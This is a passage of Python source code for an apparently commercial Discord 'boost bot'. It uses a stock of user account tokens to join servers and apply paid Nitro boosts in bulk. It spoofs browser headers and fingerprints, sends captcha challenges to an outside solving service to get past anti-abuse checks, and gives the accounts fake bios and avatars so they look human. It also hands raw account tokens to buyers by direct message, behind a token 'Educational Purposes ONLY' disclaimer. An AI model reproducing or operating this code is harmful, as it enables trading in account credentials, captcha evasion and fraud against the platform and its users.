            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Priority": "u=0, i",
            "Sec-Ch-Ua": '"Not/A)Brand;v=8", "Chromium;v=126", "Brave;v=126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-Gpc": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": self.useragent
            }
        
        tries = 0
        while tries < 10:
            try:
                r = httpx.get(f'https://discord.com/api/v9/experiments', headers=headers)
                break
            except Exception as e:
                print(f'Failed to Execute Request getting fingerprints: ' + str(e).capitalize())
                tries += 1

                if tries == 10:
                    print(f'Max Reties Completed. Failed to Execute: ' + str(e).capitalize())
                    return
            
        if not (r.status_code in (200, 201)):
            logging.error(f'Failed to Fetch Cookies from discord.com. ' + str(r.text).capitalize())
            return ''
        
        self.fp = r.json()['fingerprint']
        self.ckis = f'locale=en-US; __dcfduid={r.cookies.get("__dcfduid")}; __sdcfduid={r.cookies.get("__sdcfduid")}; __cfruid={r.cookies.get("__cfruid")}; _cfuvid={r.cookies.get("_cfuvid")}'

    def boost(self, token, guild_id):
        raw_token = token.split(":")[2] if token.count(":") >= 2 else token
        tkv = raw_token[:16] + "..." + raw_token[-6:]
        headers = {
            "authority": "discord.com",
            "scheme": "https",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": raw_token,
            "Content-Type": "application/json",
            "Cookie": str(self.ckis),
            "Origin": "https://discord.com",
            "Priority": "u=1, i",
            "Referer": "https://discord.com/channels/@me",
            "Sec-Ch-Ua": '"Not/A)Brand;v=8", "Chromium;v=126", "Brave;v=126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Gpc": "1",
            "User-Agent": self.useragent,
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            'X-fingerprint': self.fp,
            "X-Super-Properties": self.x
            }

        # 1 — Check boost slots (nitro required for boosting)
        slots = self.client.get(
            "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
            headers=headers,
        )
        slot_json = slots.json()

        if slots.status_code == 401:
            logging.error(f"{tkv} Invalid token (401)")
            self.failed.append(token)
            return

        if slots.status_code != 200 or len(slot_json) == 0:
            logging.error(f"{tkv} No Nitro / no boost slots")
            self.failed.append(token)
            return

        # 2 — Get user ID
        try:
            me_r = self.client.get("https://discord.com/api/v9/users/@me", headers=headers)
            if me_r.status_code != 200:
                logging.error(f"{tkv} Could not fetch user info ({me_r.status_code})")
                self.failed.append(token)
                return
            user_id = me_r.json().get("id")
        except Exception as e:
            logging.error(f"{tkv} User info exception: {e}")
            self.failed.append(token)
            return

        # 3 — Get or obtain OAuth access token; bot adds user to guild (no captcha)
        access_token = get_stored_oauth_token(raw_token)
        if not access_token:
            access_token, _ = get_oauth_token_from_user(raw_token)
            if access_token and user_id:
                store_oauth_token(raw_token, user_id, access_token)

        if not access_token:
            logging.error(f"{tkv} Could not get OAuth token — set bot_client_id/secret in config.json")
            self.failed.append(token)
            return

        # 4 — Bot adds user to guild via OAuth (no captcha needed)
        joined = add_member_to_guild(guild_id, user_id, access_token)
        if not joined:
            logging.error(f"{tkv} Bot could not add user to guild {guild_id}")
            self.failed.append(token)
            return
        logging.info(f"{tkv} Joined guild {guild_id} via OAuth (no captcha)")
        self.guild_id = guild_id

        # 5 — Boost the guild
        boostsList = [b["id"] for b in slot_json]
        payload = {"user_premium_guild_subscription_slot_ids": boostsList}
        boost_headers = dict(headers)
        boost_headers["method"] = "PUT"
        boost_headers["path"] = f"/api/v9/guilds/{guild_id}/premium/subscriptions"

        boosted = self.client.put(
            f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
            json=payload,
            headers=boost_headers,
        )

        if boosted.status_code == 201:
            self.success.append(token)
            db.log_boost_success(token, guild_id)
            logging.info(f"{tkv} Boosted guild {guild_id}")
            return True

        # 6 — Handle captcha on boost step (rare) — voidsolver only
        if "captcha" in boosted.text:
            logging.error(f"{tkv} Captcha on boost step — using VoidSolver")
            self.captcha.append(token)
            cap = boosted.json()
            sitekey = cap.get("captcha_sitekey")
            rqdata = cap.get("captcha_rqdata")
            rqtoken_val = cap.get("captcha_rqtoken")
            max_retries = config.get("captcha_solver", {}).get("max_retries", 3)
            for retry in range(max_retries):
                task_id = vs_captcha(sitekey, "https://discord.com/channels/@me", rqdata)
                if not task_id:
                    continue
                s2 = vs_result(task_id)
                s3 = None
                try:
                    s3 = s2.get("solvedToken") or s2.get("uuid")
                except Exception:
                    pass
                if not s3:
                    continue
                cap_hdrs = dict(boost_headers)
                cap_hdrs["X-Captcha-Key"] = s3
                cap_payload = dict(payload)
                cap_payload["captcha_key"] = s3
                if rqtoken_val:
                    cap_hdrs["X-Captcha-Rqtoken"] = rqtoken_val
                    cap_payload["captcha_rqtoken"] = rqtoken_val
                boosted2 = self.client.put(
                    f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
                    json=cap_payload,
                    headers=cap_hdrs,
                )
                if boosted2.status_code == 201:
                    self.success.append(token)
                    if token in self.captcha:
                        self.captcha.remove(token)
                    db.log_boost_success(token, guild_id)
                    logging.info(f"{tkv} Boosted (captcha solved) guild {guild_id}")
                    return True
                logging.error(f"{tkv} Captcha retry {retry+1}/{max_retries}: {boosted2.status_code}")
            self.failed.append(token)
            db.log_boost_failed(token, guild_id)
            return

        # Boost failed (non-captcha)
        logging.error(f"{tkv} Boost failed: {boosted.status_code} — {boosted.text[:120]}")
        self.failed.append(token)
        db.log_boost_failed(token, guild_id)


    def humanizer(self, token, custom_bio=None, custom_nick=None):
        if ':' in str(token):
            token = str(token).split(':')[2]

        else:
            token = token
        
        apiurl = 'https://discord.com/api/v9/guilds/' + self.guild_id + '/members/@me'
        ap = []
        _bio  = custom_bio  if custom_bio  is not None else config['customisation']['bio']
        _nick = custom_nick if custom_nick is not None else config['customisation']['nick']
        headers = {
            "authority": "discord.com",
            "scheme": "https",
            'method': 'PATCH',
            'path': f'/api/v9/guilds/' + self.guild_id + '/members/@me',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": str(token),
            "Content-Type": "application/json",
            "Cookie": str(self.ckis),
            "Origin": "https://discord.com",
            "Priority": "u=1, i",
            "Referer": "https://discord.com/channels/@me",
            "Sec-Ch-Ua": '"Not/A)Brand;v=8", "Chromium;v=126", "Brave;v=126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Gpc": "1",
            "User-Agent": self.useragent,
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            'X-fingerprint': self.fp,
            "X-Super-Properties": self.x
            }
        
        h = headers
        h['path'] = '/api/v9/users/@me/profile'

        if not (_bio == ''):
            tries = 0
            while tries < 10:
                try:
                    b = self.client.patch(
                        f'https://discord.com/api/v9/users/@me/profile',
                        headers=h,
                        json={"bio": str(_bio)}
                        )
                    break
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
                    
            if b.status_code == 200:
                ap.append(f'bio')
                    
        if not (_nick == ''):
            tries = 0
            while tries < 10:
                try:
                    b= self.client.patch(
                        apiurl,
                        headers=headers,
                        json={"nick": str(_nick)}
                        )
                    break
                
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
            if b.status_code == 200:
                ap.append(f'nick')
        
        if config['customisation']['use_custom_pfp']:
            tries = 0
            while tries < 10:
                try:
                    b = self.client.patch(
                        apiurl,
                        headers=headers,
                        json={'avatar': encoded(f'data/avatar/')}
                        )
                    break
                
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
            if b.status_code == 200:
                ap.append(f'avatar')
        
        if config['customisation']['use_custom_banner']:
            tries = 0
            while tries < 10:
                try:
                    b = self.client.patch(
                        apiurl,
                        headers=headers,
                        json={'banner': (f'data/banner/')}
                        )
                    break
                
                except Exception as e:
                    logging.error(f'Failed to execute Requests: '+str(e).capitalize())
                    tries += 1
                    if tries == 10:
                        return
            
            if b.status_code == 200:
                ap.append(f'banner')
        
        if len(ap) in (1,2,3,4):
            logging.info(f'Successfully Humanized. {ap}')
        else:
            logging.error(f'Failed to Humanized.')
            return
    
    def humanizerthread(self, tokens, custom_bio=None, custom_nick=None):
        try:
            threads = []
            thr = len(tokens)
            for i in range(thr):
                token = tokens[i]
                t = threading.Thread(target=self.humanizer(token, custom_bio, custom_nick), args=())
                t.daemon = True
                threads.append(t)
                
            for i in range(thr):
                threads[i].start()
                
            for i in range(thr):
                threads[i].join()
        
        except Exception as e:
            logging.error(f'Failed to Execute Threads: '+ str(e).capitalize())
            return

    def thread(self, guild_id, tokens):
        """"""
        threads = []

        for i in range(len(tokens)):
            token = tokens[i]
            t = threading.Thread(target=self.boost, args=(token, guild_id))
            t.daemon = True
            threads.append(t)

        for i in range(len(tokens)):
            threads[i].start()

        for i in range(len(tokens)):
            threads[i].join()

        return {
            "success": self.success,
            "failed": self.failed,
            "captcha": self.captcha,
        }
    
def getStock(filename: str):
    return db.getStock_db(db.token_type(filename))

def getStock_Auto(filename: str, num_tokens: int):
    return db.getStock_Auto_db(db.token_type(filename), num_tokens)

def getinviteCode(inv):
    if "discord.gg" in inv:
        invite = inv.split("discord.gg/")[1]
        return invite
    if "https://discord.gg" in inv:
        invite = inv.split("https://discord.gg/")[1]
        return invite
    if 'discord.com/invite' in inv:
        invite = inv.split("discord.com/invite/")[1]
        return invite
    if 'https://discord.com/invite/' in inv:
        invite = inv.split("https://discord.com/invite/")[1]
        return invite
    else:
        return inv

def checkInvite(invite: str):
    data = requests.get(
        f"https://discord.com/api/v9/invites/{invite}?inputValue={invite}&with_counts=true&with_expiration=true"
    ).json()

    if data["code"] == 10006:
        return False
    elif data:
        return data["guild"]["id"]
    else:
        return False
class BoostModal(Modal):
    def __init__(self):
        super().__init__(title = "Boost")
        self.add_item(
            TextInput(
                label = "Guild ID",
                placeholder = "Discord Server Guild ID.",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Amount",
                placeholder = "Amount of boosts (must be in numbers).",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Months",
                placeholder = "Number of months (1/3).",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx: discord.Interaction):

        guild_id = self.children[0].value.strip().replace("https://discord.com/channels/","").split("/")[0]

        amount = int(self.children[1].value)

        months = int(self.children[2].value)

        await ctx.response.defer()

        if amount % 2 != 0:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description="`Number of boosts should be in even numbers`",
                    color=0xff00bf,
                )
            )

        if months != 1 and months != 3:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description="`Invalid Input`",
                    color=0xff00bf,
                )
            )

        if not check_guild_accessible(guild_id):
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description=f"`Bot is not in guild {guild_id}. Add the bot to the server first.`",
                    color=0xff00bf,
                )
            )

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        tokensStock = getStock(filename)
        requiredStock = int(amount / 2)

        if requiredStock > len(tokensStock):
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description=f"`Not enought stock. use the command /restock to restock tokens`",
                    color=0xff00bf,
                )
            )

        boost = Booster()

        tokens = []

        for x in range(requiredStock):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)

        await ctx.followup.send(
            embed=discord.Embed(
                title="- `Boost Bot Information`", description=f"Joining And Boosting...", color=0xff00e1
            )
        )

        start = time.time()
        status = boost.thread(guild_id, tokens)
        time_taken = round(time.time() - start, 2)

        await ctx.followup.send(
            embed=discord.Embed(
                title=" - ```Boost Bot Information```",
                description=f"`Ammount:` {amount} {months}m Boosts  `Tokens:` {requiredStock} \\ `Guild ID:` {guild_id} \\ `Succeded Boosts:` {len(status['success'])*2} \\ `Failed Boosts` {len(status['failed'])}\n`Time Took` {time_taken}seconds \n \n  ** Failed ** \n``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}```",
                color=0xff00bf,
            )
        )
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="- ```Boost Bot Information```", description=f"`Ammount:` {amount} {months}m Boosts  \n`Tokens:` {requiredStock} \n`Guild ID:` {guild_id} \n`Succeded Boosts:` {len(status['success'])*2} \n`Failed Boosts` {len(status['failed'])}\n`Time Took` {time_taken}seconds \n \n  ** Failed ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}", color=0xff00e1)
            send_webhook_message(webhook_url, content, embed)

        try:
            if config['customisation']['enable']:
                boost.humanizerthread(tokens=tokens)
        except Exception as e:
            print(e)

statusb = config['status']
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.listening, name=f'{statusb}'))
    print(f"{L}[{Fore.WHITE}APP{L}]{L1} |{Style.RESET_ALL} {bot.user} Got Active Using Port 8000.{Fore.RESET}")
    try:        
        await bot.tree.sync()
        bot.add_view(PanelView())
        bot.add_view(AutoView())


        logging.info(f'Loaded Successfully In 21ms')
    except Exception as e:
        print(e)

class ViewPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Create Keys", custom_id="newkeys", style=discord.ButtonStyle.green)
    async def panel_boost(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(KeyCreationModal())
        else:
            await interaction.response.send_message("unauthorized", ephemeral=True)

    @discord.ui.button(label="Key Filter", custom_id="keyfilter", style=discord.ButtonStyle.red)
    async def panel_stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(KeyFilterModal())
        else:
            await interaction.response.send_message("unauthorized", ephemeral=True)

    @discord.ui.button(label="Request Keys", custom_id="getallkeys", style=discord.ButtonStyle.blurple)
    async def panel_stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(KeyRequestModal())
        else:
            await interaction.response.send_message("unauthorized", ephemeral=True)

@bot.tree.command(
   name="keyspanel", description="Shows the keys panel."
)
async def panel(
    ctx
):  
    embed = discord.Embed(
        title = "`Boost Bot Keys`"

    ).add_field(
        name = "`Config`",
        value = "1 - `Create New Keys` \n 1 - `Get Keys` \n 1 - `Keys Filter`"
        
    ).set_thumbnail(url = "https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66a91b6b&is=66a7c9eb&hm=da749b3d201ddfcf40d36021ec4cf8a15584d3447de7f218861fb7bbb9c229af&=&format=webp&quality=lossless&width=595&height=595")
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_message(embed = embed, view = ViewPanel())
    else: 
        await ctx.response.send_message('unauthorised')



@bot.tree.command(
    name="boost", description="Boost a server by using that command."
)
async def boost(
    ctx: discord.Interaction
):

    if str(ctx.user.id) not in config["owners_ids"]:
     member = ctx.guild.get_member(ctx.user.id)
     if str(ctx.user.id) not in config["owners_ids"] and not any(str(role.id) in config["admin_role_ids"] for role in member.roles):

        return await ctx.response.send_message(
            embed=discord.Embed(
                title="`Error`",
                description="`Missing Permistions`",
                color=0xff00bf,
            )
        )

    modal = BoostModal()
    await ctx.response.send_modal(modal)

def remove(token: str, filename: str):
    db.remove_db(token, db.token_type(filename))

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Boost", custom_id="panelboost", style=discord.ButtonStyle.green)
    async def panel_boost(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(BoostModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)

    @discord.ui.button(label="Check Stock", custom_id="panelstock", style=discord.ButtonStyle.gray)
    async def panel_stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(LivestockModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)

    @discord.ui.button(label="Manual Restock", custom_id="panelrestock", style=discord.ButtonStyle.blurple)
    async def panel_restock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(RestockModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)

    @discord.ui.button(label="Transfer Tokens", custom_id="panelgivetoken", style=discord.ButtonStyle.red)
    async def panel_givetoken(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(SendtokensModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)


class AutoView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="AutoBoost", custom_id="autoboost", style=discord.ButtonStyle.green)
    async def panel_boost(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(Auto_Boost_Modal())

    @discord.ui.button(label="Check Key", custom_id="check_key_information", style=discord.ButtonStyle.gray)
    async def check_key(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(Check_Key_Modal())

    @discord.ui.button(label="Check Stock", custom_id="check_stock", style=discord.ButtonStyle.blurple)
    async def stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(LivestockModal())

    @discord.ui.button(label="Auto Boost Guide", custom_id="auto_guide", style=discord.ButtonStyle.red)
    async def guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(
            title="`Auto Boosting Panel`",
            description=(
                "```FAQS```\n"
                "1. How to use the auto boosting?\n"
                "-> Click on the AutoBoost button and a modal/form will appear where you have to enter the key, invite of server, nickname, and bio for the tokens!\n"
                "2. What if the boosts fail?\n"
                "-> Thanks to the advanced key system! If the boosts fail, for example, you have a key with 14 boosts as balance and some boosts fail due to token issues, the total balance minus successful boosts will be deducted. The remaining balance will still be available, and you can retry with the key again!\n"
                "3. What if the bot doesn't have stock?\n"
                "-> Create a support ticket and contact the management!"
            ),
            color=0xff69b4  # Pink color
        )
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66aa6ceb&is=66a91b6b&hm=fceb67d104715faf810ba39a6f16c5ed6bdec0d0cd1b030d63cfe06856674edd&=&format=webp&quality=lossless&width=595&height=595")
        await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(
   name="boostpanel", description="Shows the boost bot panel."
)
async def panel(
    ctx
):  
    embed = discord.Embed(
        title = "`Boost Bot Config`"

    ).add_field(
        name = "`Config`",
        value = "1 - `Server Booster`\n2 - `Check Stock` \n3 - `Give Tokens To a User Via Dm` \n 4 - `Manual Restock`"
        
    ).set_thumbnail(url = "https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66a91b6b&is=66a7c9eb&hm=da749b3d201ddfcf40d36021ec4cf8a15584d3447de7f218861fb7bbb9c229af&=&format=webp&quality=lossless&width=595&height=595")
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_message(embed = embed, view = PanelView())
    else: 
        await ctx.response.send_message('unauthorised')
class SendtokensModal(Modal):
    def __init__(self):
        super().__init__(title = "Transfer Tokens")

        self.add_item(
            TextInput(
                label = "User Id",
                placeholder = "The member you want to send.",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Amount",
                placeholder = "Amount of tokens to send.",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Months",
                placeholder = "Number of months (1/3).",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx):

        member = ctx.guild.get_member(int(self.children[0].value))
        amount = int(self.children[1].value)
        months = int(self.children[2].value)

        await ctx.response.defer()

        if months != 1 and months != 3:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description="`Invalid Inputs`",
                    color=0xff00bf,
                )
            )

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        tokensStock = getStock(filename)

        if amount > len(tokensStock):
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description=f"`Not enough stock use /restock to restock`",
                    color=0xff00bf,
                )
            )

        tokens = []
        for x in range(amount):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)

        stuff = "\n".join(tokens)

        with open("result.txt", "w") as file:
            file.write(stuff.format("\n", "\n"))

        with open("result.txt", mode="rb") as f:
            await member.send(
                embed=discord.Embed(
                    title="`Boost Bot`",
                    description=f"`Thanks for using us`",
                    color=0xff00bf,
                ),
                file=discord.File(f),
            )

        return await ctx.followup.send(
            embed=discord.Embed(
                title="`Boost Bot`",
                description=f"`Sent {amount} tokens.`",
                color=0xff00bf,
            )
        )

@bot.tree.command(
name="transfertokens", description="Sends the tokens to the user."
)
async def sendtokens(
    ctx,
):

     member = ctx.guild.get_member(ctx.user.id)
     if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_modal(SendtokensModal())
     else:
         await ctx.response.send_message("❌ | stop trying to heck me :(")

class MyView(discord.ui.View):
    @discord.ui.button(label="Staff Commands", row=1, style=discord.ButtonStyle.blurple, )
    async def first_button_callback(self, interaction, button):
        await interaction.response.send_message(embed=discord.Embed(
            title="__Staff Commands__",
            description="`/boost` \n *[ Boosts a specific server that the owner tells it to ]* \n  `/restock` \n *[ Adds a txt with 1m / 3m boost tokens and adds them to stock ]* \n `/stock` \n [ Take which type of stock you wanna check! ] \n `/transfertokens` \n *[ Gets user id and sends tokens to the user in dms ]* \n `/boostpanel` \n *[ Shows admins boost panel ]* \n `/newowner` \n *[ Add new owner / admin in access the bot ( only works on user ids and not roles ) ]* \n `/failed` \n *[ Get the tokens which failed in boosting directly in your dms ]* \n `/filecleaner` \n *[ Cleans the nitro tokens file 3m Or 1m ]*",
            color=0xff00bb,
        ))
    @discord.ui.button(label="Public Commands", row=1, style=discord.ButtonStyle.red)
    async def second_button_callback(self, interaction, button):
        await interaction.response.send_message(embed=discord.Embed(
            title='__Public Commands__',
            description='**/get_key_information** \n [ Takes (key) and return information about the key such as month & boost amount it have! ] \n **/get_used_key_information** \n [ Takes (used_key) and return information about the key such as month, boost, successful boosts, failed boosts and time taken for boosting! ] \n **/use_key** \n [ Manual way of using keys! ]',
            color=0xff00bb,
        ))

@bot.tree.command( name="commands", description="It will show all the avaliable commands")
async def commands(ctx):
    await ctx.response.send_message(
        embed=discord.Embed(
            title="Command Prompt",
            description="`Options` \n 1 ~ Staff Commands [Only For Owners] \n 2 ~ Public Avaliable Commands [General]  \n `Disclaimer` \n [ This Product Is For Educational Purposes ONLY! ]",
            color=0xff00bb
            ),
            view=MyView()
    )

@bot.tree.command( name="ping", description="ping latency")
async def ping(ctx):
    await ctx.response.send_message(
        embed=discord.Embed(
            title="Ping Latency",
            description="*Ping Latency: `32.91ms`*",
            ),
    )

@bot.tree.command(name='showconfig', description='Displays the configuration from config.json')
async def showconfig(interaction: discord.Interaction):
    # Load the configuration file
    with open('config/config.json') as f:
        config = json.load(f)

    # Create the embed
    if str(interaction.user.id) not in config["owners_ids"]:
     member = interaction.guild.get_member(interaction.user.id)
     if str(interaction.user.id) not in config["owners_ids"] and not any(str(role.id) in config["admin_role_ids"] for role in member.roles):

        return await interaction.response.send_message(
            embed=discord.Embed(
                title="`Error`",
                description="`Missing Permistions`",
                color=0xff00bf,
            )
        )

    embed = discord.Embed(title='`Config File`', color=discord.Color.from_rgb(255, 0, 238))  # Pink color
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66aa6ceb&is=66a91b6b&hm=fceb67d104715faf810ba39a6f16c5ed6bdec0d0cd1b030d63cfe06856674edd&=&format=webp&quality=lossless&width=595&height=595')  # Replace with your thumbnail URL

    # Add fields for each item in the configuration
    for key, value in config.items():
        embed.add_field(name=key, value=str(value), inline=False)

    # Send the embed
    await interaction.response.send_message(embed=embed)




@bot.tree.command(
 name="newowner", description="Add a member as a owner."
)
async def newowner(
    ctx,
    member: discord.Member
):
    if str(ctx.user.id) not in config["owners_ids"]:
        return await ctx.response.send_message(
            embed=discord.Embed(
                title="**ERROR**",
                description="❎ | You cannot use this command.",
                color=0x2F3136,
            )
        )

    config["owners_ids"].append(str(member.id))
    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=4)
    c = ctx.channel
    return await c.send(
        embed=discord.Embed(
            title="Boost Bot",
            description=f"✅ | Added owner successfully",
            color=0x2F3136,
        )
    )

@bot.tree.command(
 name="addadmin_role", description="Add a member as a owner."
)
async def addadmin_role(
    ctx,
    role: discord.Role
):
    if str(ctx.user.id) not in config["owners_ids"]:
        return await ctx.response.send_message(
            embed=discord.Embed(
                title="**ERROR**",
                description="❎ | You cannot use this command.",
                color=0x2F3136,
            )
        )
    c = ctx.channel    
    config["admin_role_ids"].append(str(role.id))
    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=4)

    return await c.send(
        embed=discord.Embed(
            title="Boost Bot",
            description=f"✅ | Added admin successfully",
            color=0x2F3136,
        )
    )

import asyncio


class LivestockModal(Modal):
    def __init__(self):
        super().__init__(title="Stocks")

        self.add_item(
            TextInput(
                label="Duration",
                placeholder="Months? [1/3]",
                required=True,
                style=discord.TextStyle.short
            )
        )

    async def on_submit(self, interaction: Interaction):
        duration = int(self.children[0].value)

        await interaction.response.defer(ephemeral=False)

        if duration not in [1, 3]:
            return await interaction.followup.send(
                embed=discord.Embed(
                    title="`Error`",
                    description="`Invalid Type` ",
                    color=0x2F3136,
                ), ephemeral=True
            )

        async def update_stock_message(message):
            while True:
                stock = db.count_tokens_db(str(duration) + "m")

                embed = discord.Embed(
                    title=f"```{duration}m Tokens Live Stock```",
                    description=f"\n *`{stock}` Nitro Tokens In Stock* \n *`{stock * 2}` Boosts Available In Stock*",
                    color=0xff008c,
                )
                await message.edit(embed=embed)
                await asyncio.sleep(config["refresh_interval"])  # Refresh based on config

        initial_embed = discord.Embed(
            title=f"```{duration}m Tokens Live Stock```",
            description=f"Refreshing in {config['refresh_interval'] // 60} minutes...",
            color=0xff008c,
        )

        message = await interaction.followup.send(embed=initial_embed)
        await update_stock_message(message)

# Ensure the command function is a coroutine
@bot.tree.command(name="livestock", description="Display the stock of boosts and tokens.")
async def show_livestock(interaction: discord.Interaction):
    await interaction.response.send_modal(LivestockModal())


class RestockModal(Modal):
    def __init__(self):
        super().__init__(title="Restock Tokens")

        self.add_item(
            TextInput(
                label="Duration",
                placeholder="Months? [1/3]",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Tokens",
                placeholder="Enter Tokens",
                required=True,
                style=discord.TextStyle.paragraph,
                max_length=4000
            )
        )

    async def on_submit(self, ctx: Interaction):
        duration = int(self.children[0].value)
        input_value = str(self.children[1].value)
        tokens = re.split(r',|\n', input_value)

        if duration not in [1, 3]:
            return await ctx.response.send_message(
                embed=discord.Embed(
                    title=f"**👎 `404 ERROR` - **{bot.user}****",
                    description="👎 - ```Invalid Duration. Number should be 1-3```",
                    color=0xff00d4,
                )
            )

        clean_tokens = [t.strip() for t in tokens if t.strip()]
        db.add_tokens_db(str(duration) + "m", clean_tokens)

        await ctx.response.send_message(
            embed=discord.Embed(
                title="`Restock`",
                description=f"`Restocked {len(clean_tokens)}x tokens for {duration}m `",
                color=0xff00d4,
            )
        )

        await ctx.followup.send(
            embed=discord.Embed(
                title=f"- `Restock`",
                description=f"`Restocked {len(clean_tokens)}x tokens for {duration}m` ",
                color=0xff00d9,
            )
        )

@bot.tree.command(
